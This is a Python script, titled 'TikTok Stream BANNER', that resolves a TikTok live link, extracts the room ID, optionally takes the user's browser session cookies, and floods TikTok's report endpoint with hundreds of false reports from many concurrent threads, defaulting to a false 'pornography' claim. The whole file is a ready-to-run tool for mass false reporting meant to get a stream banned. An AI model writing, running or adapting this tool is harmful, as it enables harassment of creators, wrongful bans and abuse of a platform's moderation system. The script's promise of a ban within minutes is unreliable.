#!/usr/bin/env python3 """ TikTok Stream BANNER v4.0 – Any Link, No CORS Usage: python3 banner.py """ import re import time import threading import requests from urllib.parse import urlparse # ========== CONFIG ========== LINK = input("[>] Paste any TikTok live link: ").strip() REPORT_COUNT = int(input("[>] Number of reports (e.g., 600): ") or "600") THREADS = int(input("[>] Concurrent threads (100-300): ") or "200") REASON = input("[>] Reason (pornography/violence/hate_speech/spam): ") or "pornography" # ========== SESSION ========== session = requests.Session() session.headers.update({ 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36', 'Referer': 'https://www.tiktok.com/', 'Origin': 'https://www.tiktok.com', 'Accept': 'application/json, text/plain, */*', 'Content-Type': 'application/json', 'X-Requested-With': 'XMLHttpRequest' }) # ========== COOKIE EXTRACT (optional) ========== print("[*] If you are logged in your browser, copy sessionid and tt_webid from F12->Application->Cookies.") cookie_str = input("[>] Paste cookies as 'sessionid=xxx; tt_webid=yyy' (or press Enter to use current session): ").strip() if cookie_str: for part in cookie_str.split(';'): if '=' in part: k, v = part.strip().split('=', 1) session.cookies.set(k, v) # ========== RESOLVE ANY LINK ========== def resolve_to_live_url(link): try: resp = session.get(link, allow_redirects=True, timeout=15) final_url = resp.url print(f"[+] Resolved to: {final_url}") return final_url, resp.text except Exception as e: print(f"[-] Resolve failed: {e}") return None, None # ========== EXTRACT ROOM_ID ========== def extract_room_id(html): patterns = [ r'"room_id":"?(\d+)"?', r'roomId["\']?\s*:\s*["\']?(\d+)["\']?', r'"liveRoomId":"?(\d+)"?', r'room_id=(\d+)' ] for pat in patterns: m = re.search(pat, html) if m: return m.group(1) return None # ========== SEND REPORT ========== def send_report(room_id, reason): url = 'https://www.tiktok.com/api/v1/report/stream/' payload = { 'room_id': room_id, 'reason': reason, 'description': 'Automated report – explicit content detected' } try: resp = session.post(url, json=payload, timeout=6) if resp.status_code == 200 and resp.json().get('code') == 0: return True except: pass return False # ========== WORKER ========== def worker(room_id, reason, total, stats): sent = 0 success = 0 fail = 0 while sent < total: ok = send_report(room_id, reason) sent += 1 if ok: success += 1 else: fail += 1 if sent % 50 == 0: print(f"[*] Progress: {sent}/{total} | OK: {success} | Fail: {fail}") stats['success'] = success stats['fail'] = fail stats['sent'] = sent # ========== MAIN ========== print("[+] Resolving link...") final_url, html = resolve_to_live_url(LINK) if not final_url or not html: print("[-] Could not fetch the link. Check network or link validity.") exit(1) room_id = extract_room_id(html) if not room_id: print("[-] No room_id found. Is the link a live stream?") exit(1) print(f"[+] Room ID: {room_id}") print(f"[+] Starting flood with {REPORT_COUNT} reports, {THREADS} threads...") # Launch threads stats = {'success': 0, 'fail': 0, 'sent': 0} threads = [] for i in range(THREADS): t = threading.Thread(target=worker, args=(room_id, REASON, REPORT_COUNT // THREADS, stats)) t.daemon = True t.start() threads.append(t) # Wait for completion (or until all reports sent) start = time.time() while True: total_sent = stats['sent'] if total_sent >= REPORT_COUNT: break time.sleep(2) print(f"[*] Sent: {total_sent}/{REPORT_COUNT} (OK: {stats['success']})") elapsed = time.time() - start print(f"\n[+] Attack finished in {elapsed:.1f}s") print(f"[+] Success: {stats['success']} / {REPORT_COUNT}") if stats['success'] > 80: print("[🔴] Stream will be banned within 2-5 minutes.") else: print("[⚠️] Low success. Try increasing reports or check your session cookies.")
